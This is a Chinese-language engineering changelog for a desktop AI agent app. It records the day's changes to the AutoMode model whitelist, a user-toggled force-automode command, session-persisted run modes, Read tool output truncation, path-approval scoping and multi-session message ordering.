- **Why**: 用户希望项目 chip 鼠标悬停时只显示完整路径，不要 `allowed` 等标签；同时 workdir 与 allowed paths 要有清晰视觉分隔
- **改动**:
  - [apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx): 项目 chip 的 hover 内容改为 workdir 路径在上、双分割线、allowed paths 路径列表在下
- **影响范围**: 仅 Desktop 前端展示；不改协议、不改持久化、不影响项目/会话数据
- **留尾巴**: 无

### 2026-05-19 — 修正 VS Code workspace 导入的相对路径转换规则

- **Why**: 用户导入 `../../other/hebbian.code-workspace` 时发现，`../rust/hebbian` 被保存成带 `other/..` 的未归一化绝对路径，后续 `sub2api` 又被错误拼到 workdir 下；实际期望是第一个 folder 变成规范全局 workdir，其余相对 folder 按原 workspace 文件位置解析后，再保存成相对 workdir 父目录的相对路径
- **改动**:
  - [crates/agent-core/src/storage/projects.rs](../crates/agent-core/src/storage/projects.rs): VS Code workspace 导入新增 lexical path normalize；首个 folder 规范化为绝对 workdir；后续相对 folder 改写为相对 workdir 父目录的路径，绝对 folder 继续保存为规范绝对路径；新增覆盖 `../rust/hebbian` / `sub2api` / `../claude-code-haha` / `../rust/cc-switch` 的回归测试
  - [docs/架构.md](架构.md): 同步更新 `importVscodeProject` 的路径归一化语义
- **影响范围**: agent-core storage / Desktop 导入项目命令；不改项目 JSON 字段结构，不影响已有项目文件，后续重新导入 VS Code workspace 会按新规则落盘
- **留尾巴**: 已导入过的旧项目不会自动迁移，需要用户重新导入或手动调整项目目录


### 2026-05-19 — AutoMode 收尾：CLI 路径回退、白名单 exact match、Desktop `//` 命令系统落地

- **Why**: 上一条 AutoMode 落地把 `--force-automode` flag / REPL 命令塞进了 `apps/cli`，但 changelog 早就写过"先不考虑 tui cli"且 `apps/cli` 已经从 Cargo workspace 排除，那条改动方向错了；同时白名单的 substring 匹配过宽，`gpt-5.5-mini` 这种"基础名同、能力差很多"的模型会误开 AutoMode；需要把唯一 surface（Desktop）补上等价的入口
- **改动**:
  - [apps/cli/src/main.rs](../apps/cli/src/main.rs) / [apps/cli/src/session.rs](../apps/cli/src/session.rs): 完全 revert 上一条加的 `--force-automode` flag + REPL `/force-automode` 命令——cli 已脱离 workspace，不再维护
  - [crates/agent-core/src/automode.rs](../crates/agent-core/src/automode.rs): `AUTOMODE_ALLOWED_MODELS` 从 substring 匹配改为 exact match，白名单收紧到 `&["opus-4-7", "opus4.7", "gpt-5.5"]`；带前缀（`claude-opus-4-7`）/ 后缀（`gpt-5.5-preview` / `gpt-5.5-mini` / `opus-4-7-20260416`）一律降级 Ask；新增 `is_allowed_model` 单测覆盖三类拒绝场景；上一条遗留的 substring 留尾巴清掉
  - [docs/架构.md](../docs/架构.md): §3.3 / §6.1 / §6.3.1 / §10.3 / §16 / §13 / §14 清扫 CLI / TUI / REPL / `--mock` 残留；§13 删 D7 + 8.3.x 系列 8 行；§14 步骤表把 CoreClient 转发收敛到 Desktop、删 Step 13 TUI；新增 §8 "Desktop 命令系统"章节定义 `//` 前缀的本地命令派发规范（前端拦截 / fail-closed / 三层后端落点）
  - [CLAUDE.md](../CLAUDE.md): 清扫第 34 / 161 行的 CLI / TUI / REPL / hebbian-cli 残留
  - [apps/desktop/src/force_automode.rs](../apps/desktop/src/force_automode.rs): 新增进程级 `ForceAutomodeState`（`Mutex<HashMap<session_id, bool>>`），重启回归 `false`；选 in-memory 而非写 session.json 的理由：危险开关重启回归默认更安全，且老 session 反序列化无需迁移
  - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): 注册 `ForceAutomodeState`；新增 `get_force_automode` / `set_force_automode` Tauri command；`send_message` 拿 State 注入到 `SendArgs.force_automode`
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): `SendArgs` 加 `force_automode: bool`，构造 `SessionConfig` 时透传（替换原硬编码 `false`）
  - [apps/desktop/frontend/src/desktop/ui/lib/slashCommands.ts](../apps/desktop/frontend/src/desktop/ui/lib/slashCommands.ts): 新增 `dispatchSlashCommand`，注册表只挂 `force-automode` 一条，支持 `on/off/toggle/status`（无参 = toggle）；未知命令 / 参数非法走 toast error；输入框 onSubmit 命中 `//` 前缀时一律本地派发
  - [apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx): submit 路径在 `/compact` 拦截之后、`onSend` 之前调 `dispatchSlashCommand`；命中即清输入框 / 重置历史光标，错误走 toast
  - [apps/desktop/frontend/src/desktop/bridge/tauri.ts](../apps/desktop/frontend/src/desktop/bridge/tauri.ts): 新增 `api.getForceAutomode` / `api.setForceAutomode`
- **影响范围**:
  - `apps/cli` 回到上一条 AutoMode 改动**之前**的状态（除已经修的 shell_parse.rs，那部分保留）
  - `SendArgs` 加 `force_automode: bool` 字段——chat.rs 内部测试两处构造点已同步补 `force_automode: false`
  - 协议无变化（只是 Tauri command 新增 2 个，不影响 send_message 既有签名）
  - 架构.md 减小覆盖面：CLI / TUI / REPL 全部移出唯一设计准则，新增 §8 章节正式收纳 `//` 命令规范
- **留尾巴**:
  - 🟡 §8 命令清单当前只有 `//force-automode` 一条，后续按需追加 `//run-mode <mode>` / `//clear` / `//compact <hint>`（把 ChatInput.tsx 里硬编码的 `/compact` 拦截搬过来统一）
  - 🟡 前端没有可视化徽章显示 `force_automode` 当前状态——目前用 `//force-automode status` 查；后续如果要做 status pill，从 `api.getForceAutomode` 拉就行
  - 🟡 `force_automode` 不持久化的取舍可能要复盘：用户重启 desktop 后会"以为还开着"。当前依赖 toast 反馈 + status 子命令兜底，等多用户后看是否需要落 session
  - 🟡 上一条 changelog 提的"判官 prompt 英文严格格式"的兜底观察期继续——本次没动 prompt 文件
- **关联**: 架构 §4.4.4 / §8 / §13；上一条 changelog（同日 AutoMode 落地）

### 2026-05-19 — 将允许访问项统一迁移为 allowed_paths 并增强路径列表 UI

- **Why**: 用户指出允许访问项已经同时包含目录和文件，继续使用 allowed_dirs / 允许目录会误导；左侧项目允许列表也需要限制行数、超出滚动，并区分目录与不同类型文件
- **改动**:
  - [crates/agent-core/src/storage/settings.rs](../crates/agent-core/src/storage/settings.rs) / [crates/agent-core/src/storage/sessions.rs](../crates/agent-core/src/storage/sessions.rs) / [crates/agent-core/src/storage/projects.rs](../crates/agent-core/src/storage/projects.rs): 持久化字段统一写出 `allowed_paths` / `runtime_allowed_paths` / `pending_runtime_allowed_paths`；读侧保留旧 `allowed_dirs` 系列 alias；新增兼容测试覆盖旧设置、旧 rollout meta、旧项目输入
  - [crates/agent-core/src/workspace.rs](../crates/agent-core/src/workspace.rs) / [crates/agent-core/src/session.rs](../crates/agent-core/src/session.rs) / [crates/agent-core/src/tools](../crates/agent-core/src/tools): 内部注释、workspace-update 文案、工具描述从允许目录改为允许路径
  - [apps/desktop/frontend/src/desktop/ui/components/workspaceFields.tsx](../apps/desktop/frontend/src/desktop/ui/components/workspaceFields.tsx): `DirListField` 改为 `PathListField`，支持分别添加文件/文件夹，文件按常见类型显示不同 lucide 图标，列表支持 `maxVisibleRows` 后滚动
  - [apps/desktop/frontend/src/desktop/ui/components/Sidebar.tsx](../apps/desktop/frontend/src/desktop/ui/components/Sidebar.tsx): 项目详情里的允许路径列表最多显示 5 行，超出滚动；文案改为“允许访问的路径”
  - [apps/desktop/frontend/src/desktop/ui/components/AppSettingsDialog.tsx](../apps/desktop/frontend/src/desktop/ui/components/AppSettingsDialog.tsx) / [apps/desktop/frontend/src/desktop/ui/components/SessionSettingsDialog.tsx](../apps/desktop/frontend/src/desktop/ui/components/SessionSettingsDialog.tsx) / [apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx) / [apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx](../apps/desktop/frontend/src/desktop/ui/components/PermissionApprovalPopup.tsx): UI 文案统一为允许路径；输入框菜单增加“允许访问文件 / 允许访问文件夹”，chip 图标按路径类型区分
  - [docs/架构.md](架构.md): 同步 `folders[1..]`、模板变量和 storage 布局中的 `allowed_paths` 语义
- **影响范围**:
  - agent-core storage / workspace / prompt 注入文案；Desktop frontend workspace/project/session settings；Tauri 参数保持 camelCase `allowedPaths`
  - 向后兼容旧 `allowed_dirs` JSON / jsonl 字段，保存后会按新字段写出；CLI 参数名从 `--allowed-dir` 收敛为 `--allowed-path`
- **留尾巴**: 无


### 2026-05-19 — Desktop ChatInput 加号右侧增设 `//` 命令 popup 与 RunMode chip

- **Why**: 用户希望在输入框工具栏看到一个一目了然的入口——`//` 按钮列出注册的所有命令、命中后填入输入框等敲参数；mode chip 实时显示当前 RunMode 并支持下拉切换。原 `//force-automode` 只能键盘敲，对鼠标党不友好；同时 RunMode 在后端长期被写死 `RunMode::default()`，前端从未接入切换路径
- **改动**:
  - [apps/desktop/src/run_mode_state.rs](../apps/desktop/src/run_mode_state.rs): 新增进程级 `RunModeState`（`Mutex<HashMap<session_id, RunMode>>`），复用 ForceAutomodeState 的 in-memory pattern；重启回归 `AskBeforeEdits`
  - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): 注册 `RunModeState`；新增 `get_run_mode` / `set_run_mode` Tauri command（后者校验字符串可被 `RunMode::parse` 解析）；`send_message` 新增 `run_mode: State<...>` 注入并往 `SendArgs` 透传
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): `SendArgs` 加 `run_mode: RunMode` 字段，构造 `SessionConfig` 时替换原硬编码 `RunMode::default()`；测试构造点同步补默认值
  - [apps/desktop/frontend/src/desktop/bridge/tauri.ts](../apps/desktop/frontend/src/desktop/bridge/tauri.ts): 新增 `api.getRunMode` / `api.setRunMode`
  - [apps/desktop/frontend/src/desktop/ui/lib/slashCommands.ts](../apps/desktop/frontend/src/desktop/ui/lib/slashCommands.ts): 暴露 `SlashCommandMeta` 与 `slashCommandCatalog`——是 popup 的数据源；同步 `parseBoolArg` 的大小写归一化，避免 `On/OFF/Toggle` 这种混合大小写命中默认分支
  - [apps/desktop/frontend/src/desktop/ui/components/SlashCommandButton.tsx](../apps/desktop/frontend/src/desktop/ui/components/SlashCommandButton.tsx): 新增；工具栏 `//` 图标按钮 + popup 渲染 `slashCommandCatalog`，点击回调把 `//${name} ` 写入输入框
  - [apps/desktop/frontend/src/desktop/ui/components/RunModeChip.tsx](../apps/desktop/frontend/src/desktop/ui/components/RunModeChip.tsx): 新增；显示当前 RunMode 的人类可读 label（"Ask before edits" / "Edit automatically" / "Plan mode" / "Auto mode"），点击下拉切换，调 `api.setRunMode` 并本地 setState
  - [apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx): 把原加号 wrapper 改成水平 group 容纳 `SlashCommandButton` 与 `RunModeChip`；右侧 ModelPicker / 发送按钮不动；`//` popup 命中后 `setValue` 追加在末尾并 focus 输入框光标到末尾（保持已有草稿不被覆盖）
  - [docs/架构.md](../docs/架构.md): §8.1 加原则 6（工具栏入口与 `//` 命令并存）；§8.2 表加 `//run-mode` 行与"工具栏入口"列
- **设计取舍**:
  - **RunMode in-memory 而非持久化**：先做到能切 + 立即生效。等多用户反馈"切完关掉再开希望保留"再统一搬到 session.json；现在持久化要先解决老 jsonl 兼容 / prompt cache 边界 / Switch marker 是否插入等问题，本期不掺这个雷
  - **mode chip 不挂 `//` 命令文字**：避免与 `//force-automode` 这种"子开关"类命令在 popup 列表里互相干扰；命令清单（架构 §8.2）依然把 mode chip 当作 §8 命令系统的一员登记，理由是它们共享相同的 Tauri command pattern 与失败语义
  - **popup 命中后填入输入框（而非直接执行）**：用户决策。`//force-automode` 在不带参数时是 toggle，带参数时是 set——填入输入框让用户决定要不要补参，比"无脑 toggle"对预期更友好
- **影响范围**:
  - 协议无变化（新增两个 Tauri command，不破坏既有 send_message 签名——`run_mode` 字段是 State 注入，IPC 入参不变）
  - `SendArgs` 加 `run_mode` 字段；chat 内部两处测试构造点已同步
  - 老 session 不影响：进程级 state 默认 `AskBeforeEdits`，与之前硬编码值一致
- **留尾巴**:
  - 🟡 RunMode 不持久化：用户重启 desktop 后会回到 `AskBeforeEdits`，可能与上次工作期望不一致；当 mode chip 也加可视化 badge 提示"刚刚重置过"时再复盘
  - 🟡 切到 `AutoMode` 时若当前模型不在白名单（不是 opus-4-7 / gpt-5.5），目前 chip 静默切换、运行时 `judge_auto_mode` 才返回 Ask 降级；后续可以在 chip 切换时做一次 model 白名单 precheck，给出 toast 警告
  - 🟡 `PlanMode` 在 dispatcher 里的工具过滤当前还是 TODO（架构 §4.4.5 占位），切到 PlanMode 暂时跟 AskBeforeEdits 行为一致——chip 本身已经能切，等 PlanMode 实装时无需再改前端
- **关联**: 架构 §4.4.3 / §8.1 / §8.2；与上一条 changelog（AutoMode 收尾）同日续作


### 2026-05-19 — RunMode 升级为 Session 持久化字段（替换上一条的 in-memory 方案）

- **Why**: 上一条 changelog 把 RunMode 放在 desktop 进程级 `RunModeState` 里，用户重启或换窗口就丢失，与"已有对话的 mode 跟着对话走"的直觉不符；用户明确要求把 mode 持久化到 Session 配置里
- **改动**:
  - [crates/agent-core/src/storage/sessions.rs](../crates/agent-core/src/storage/sessions.rs): `Session` / `RolloutMeta` / `MetaUpdate` 三处都加 `run_mode` 字段，全部带 `#[serde(default)]`——老 jsonl / 老 `.json` 反序列化回退 `AskBeforeEdits`，与切换前硬编码行为一致；`meta_from_session` / `apply_meta` / `apply_update` 透传；`read_jsonl` 初始化 Session、`create_with_source` / `fork` 构造点补字段；新增 `sessions::set_run_mode(data_dir, id, mode)` helper，**追加一行 `RolloutLine::MetaUpdate { run_mode: Some(_) }`**（不重写 messages），与 `rename` 同 pattern
  - [apps/desktop/src/run_mode_state.rs](../apps/desktop/src/run_mode_state.rs): **删除**——in-memory 中间层不再需要
  - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): 删 `RunModeState` 模块 / pub use / `.manage()`；`get_run_mode` 改为 `sessions::load(...).run_mode`；`set_run_mode` 改为 `sessions::set_run_mode(...)`；`send_message` 不再注入 RunMode State——run_mode 由 chat.rs 内部从 `prior_session` 取
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): `SendArgs` 去掉 `run_mode` 字段；构造 `SessionConfig` 时改为 `run_mode: prior_session.run_mode`；测试构造点对应回收
  - [docs/架构.md](../docs/架构.md): §4.4.3 新增"持久化"小段，说明 `Session.run_mode` + `MetaUpdate` append-only 切换路径；§8.1.3 把命令后端落点分类改为"进程级 / 会话级持久 / agent-core API"三档；§8.2 表里 `//run-mode` 行的"后端 Tauri commands"列补注"落到 `Session.run_mode`，跨重启保留"
- **设计取舍**:
  - **MetaUpdate append 而非 save 全量重写**：rename 走的就是这套；RunMode 切换频率可能高（用户调几下试），全量重写大 session.jsonl 会是浪费
  - **从 `RunModeState` in-memory 改为 Session 字段**：本来 force_automode 是"危险开关重启回归默认"的语义所以 in-memory 合理；RunMode 是会话级偏好，跟着 Session 走更符合用户预期；多窗口共享 desktop 进程时也保证一致（虽然 in-memory 在同进程也 OK，但 fail-safe 多一层）
  - **prompt cache 不受影响**：架构 §4.4.3 早定下"mode 不进 system prompt"，新增字段也只影响 storage 层与 SEMI 段；prompt cache 命中边界不变
- **影响范围**:
  - `Session` / `RolloutMeta` / `MetaUpdate` schema 字段新增——老数据完全兼容（`#[serde(default)]` 兜底为 `AskBeforeEdits`），但已经写过新字段的 jsonl 不能被旧版本 hebbian 二进制读（因为旧版没有 RunMode 反序列化器）——本仓库单向演进，不构成问题
  - `SendArgs.run_mode` 字段移除——之前唯一调用点是 desktop 的 `send_message`，已同步更新；CLI 路径不受影响（已脱离 workspace）
  - 桌面 in-memory `RunModeState` 完全删除
- **留尾巴**:
  - 🟡 mode chip 切换到 `AutoMode` 时，如果当前 session.model 不在白名单（不是 opus-4-7 / gpt-5.5），目前 chip 静默落盘、运行时 `judge_auto_mode` 才降级为 Ask；后续给 chip 加一次 model 白名单 precheck + toast 警告
  - 🟡 `PlanMode` 的工具过滤仍是 TODO（§4.4.5 占位）；切到 PlanMode 现在能落盘了，但运行时与 AskBeforeEdits 行为一致
  - 🟡 `MetaUpdate` 行随时间累积——每切换一次 RunMode 多一行 jsonl；与 `rename` 同性质，目前不做 compaction
- **关联**: 架构 §4.4.3 / §6.2 / §8；与上一条 changelog（mode chip 工具栏入口）同日续作

### 2026-05-19 — Read 工具重构：单行截断 + 整体 6KB 截断 + 豁免 materialize 落盘

- **Why**: 
  - 死循环：Read 读一个 2000 行的常规源文件 → 输出 ~100KB → dispatch `materialize_tool_output` 把整份落盘到 `tool_results/<call_id>.txt`、inline 给"完整内容已落盘到 xxx → 请用 Read 翻页"指针 → agent 照做，Read 这个落盘文件 → 又 100KB → 又落盘 → 死循环
  - 根因：Read 是**分页工具**，本身提供 offset/limit 翻页，再叠一层 materialize 语义重复且误导向落盘文件触发的二次 Read
  - 与 Claude Code 对照分析（对 2.1.143 二进制 `strings` 转储反推）：CC Read 描述里写 "verbatim file content"（逐字原文），不做单行截断，不做整体落盘，没有 MAX_FILE_BYTES 硬拒绝——完全信任 agent 用 offset/limit 自控。但 hebbian 没有 CC 服务端的 context compaction 兜底，需要安全网
- **改动**:
  - [crates/agent-core/src/tools/read.rs](../crates/agent-core/src/tools/read.rs): 
    - 新增 `data_dir` / `session_id` 字段（≥ `ReadTool::new` 接受），用于超长行剩余部分落盘
    - **单行截断**：行 > 2000 字符时截断，inline 显示前 2000 字符 + `…[截断，剩余 N 字符已落盘 /path]`；剩余部分保存到 `<data_dir>/sessions/<sid>/line_trunc/<file_hash>_L<line>.txt`，按 ~2000 字符换行
    - **整体 6KB 输出截断**：输出超 ~6KB 后停止追加新行，附加 `[输出截断：已显示 N 行。后续约 M 行未显示。请用 offset/limit 翻页读取（当前 offset=X limit=Y）。]` —— **不落盘**，不给出"请用 Read 读这个文件"的指针
    - 无 `data_dir` / `session_id` 时，超长行截断仅标注剩余字符数，不落盘
  - [crates/agent-core/src/tools/mod.rs](../crates/agent-core/src/tools/mod.rs): `default_tools` 签名加 `data_dir: Option<PathBuf>` / `session_id: Option<String>`，透传给 `ReadTool::new`
  - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs): `materialize_tool_output` 豁免 Read（`call.name == "Read"` 时跳过落盘 + `truncate_tool_result`），Read 自身已做截断控制
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): 两处 `default_tools` 调用传 `Some(data_dir)` / `Some(session_id)`（主路径）或 `None, None`（工具预览路径）
  - [apps/cli/src/main.rs](../apps/cli/src/main.rs): 同步新签名（CLI 已从 workspace 排除，仅为避免复活时编译错误）
- **设计取舍**:
  - **不全文落盘**（与 old materialize 行为断舍离）：Read 是分页工具，落盘 + 指针诱导 agent 读落盘文件 → 文件又触发 materialize → 死循环。改为截断后仅给 offset/limit 提示，agent 天然知道怎么翻页
  - **长行截断后落盘（而不是完全不截断）**：CC 的 "verbatim" 策略在 hebbian 没有 compaction 兜底时风险太高（单行 minified JS 50KB 直通模型可能撑爆上下文窗口）；截断 + 落盘剩余部分 = 安全网
  - **保留 `MAX_FILE_BYTES = 5MB`**：与 CC 不同，但 hebbian 纯读文件不需要 agent 阅读 >5MB 的二进制；agent 真需要时可以用 `Bash + head -c` 或者 Grep 切片
- **影响范围**:
  - agent-core: Read 工具 / `default_tools` / dispatch materialize 路径
  - desktop: `chat.rs` 两处调用点
  - CLI: 签名同步（已脱离 workspace）
  - 协议无变化（EventPayload / ToolResult 不变；Read 不再产生 artifact_path，前端 MessageBubble 已有 `artifact_path = None` 处理）
  - 前端无变化
- **留尾巴**:
  - 🟡 超长行剩余文件（`line_trunc/` 目录）不随 session 删除自动清理——单行截断场景罕见（minified JS / 巨大 JSON single-line），累积量可忽略
  - 🟡 `MAX_FILE_BYTES = 5MB` 硬拒绝可在用户反馈后再评估是否去除或提高
- **关联**: Claude Code 2.1.143 binary 对照分析（`wpH=2000`、verbatim 语义、无 artifact 落盘）；架构 §4.4 / §4.4.9

### 2026-05-19 — dispatch 路径越界检查：hebbian 数据目录自动放行

- **Why**: Read 截断落盘的 `line_trunc/` 文件位于 `~/.hebbian/sessions/<sid>/` 下，agent 尝试读取这些文件时会触发 PathAccess 审批——但这些是 agent 自己的工具输出，不该走权限系统。同理 `tool_results/`、`bg/` 等 hebbian 内部文件都应在界内
- **改动**:
  - [crates/agent-core/src/dispatch.rs](../crates/agent-core/src/dispatch.rs): `out_of_scope` 过滤加第二道 `filter`：以 `<data_dir>/sessions/<session_id>/` 为前缀的路径视为在界内，不触发 PathAccess 审批。范围限定在当前 session 目录（`tool_results/`、`line_trunc/`、`bg/` 等），不包含 `~/.hebbian/settings.json`、`permissions.json` 等配置文件
- **影响范围**: agent-core dispatch；不影响已有 HITL 审批逻辑（路径不在当前 session 目录下仍按原规则检查）
- **留尾巴**: 无

### 2026-05-19 — 修复 Desktop 多会话并行发送与流式插队顺序

- **Why**: 用户反馈一个对话运行时，其他对话和新建对话的发送按钮一直转圈、不能发送；同一对话运行时引导插队也被挡住；并且插队 user message 会在持久化历史里跑到当前正在输出的 assistant 前面
- **改动**:
  - [apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx](../apps/desktop/frontend/src/desktop/ui/components/ChatInput.tsx): 发送按钮的 `sending` 只覆盖本次提交动作，不再等待整轮 `sendUserMessage` 完成；后台 run 的状态由 `sessionStreams` / `isStreaming` 驱动
  - [apps/desktop/frontend/src/desktop/ui/store/useStore.ts](../apps/desktop/frontend/src/desktop/ui/store/useStore.ts): `sendUserMessage` 内部改为按 session 执行，队列 `drainNext` 不再依赖当前打开的 session；切到其他对话后，原对话的 queued input 仍能按 FIFO 继续发
  - [crates/common/src/runtime.rs](../crates/common/src/runtime.rs) / [crates/agent-core/src/agent_loop.rs](../crates/agent-core/src/agent_loop.rs) / [crates/agent-core/src/harness.rs](../crates/agent-core/src/harness.rs) / [crates/agent-core/src/session.rs](../crates/agent-core/src/session.rs): 在 `PendingInputs` 外增加已消费副本 `ConsumedPendingInputs`，agent_loop drain 插队输入时同步记录，供 surface 在 run 结束后落盘
  - [apps/desktop/src/lib.rs](../apps/desktop/src/lib.rs): `inject_user_message` 只注入当前 run，不再立即 append 到 session.jsonl；run 已结束时返回错误，让前端保留队列项供重试
  - [apps/desktop/src/chat.rs](../apps/desktop/src/chat.rs): run 正常完成后先落当前 assistant，再把已消费和未消费的 pending user message 排到 assistant 后面落盘；新增单测覆盖"模型看见插队输入 + jsonl 顺序为 user → assistant → 插队 user"
- **影响范围**: desktop 前端 store/input、desktop Tauri chat 路径、agent-core run 参数、common runtime；协议 `EventPayload` 与 Tauri `send_message` IPC 入参不变，老 session 文件兼容
- **留尾巴**: 中断 / 失败路径仍按现有 partial assistant + marker / failed assistant 逻辑收尾，未额外追加未消费 pending input；如果用户在失败前刚点引导，前端队列项会因 `inject_user_message` 失败还原，已成功注入但 run 随后失败的极端场景后续可再细化恢复策略
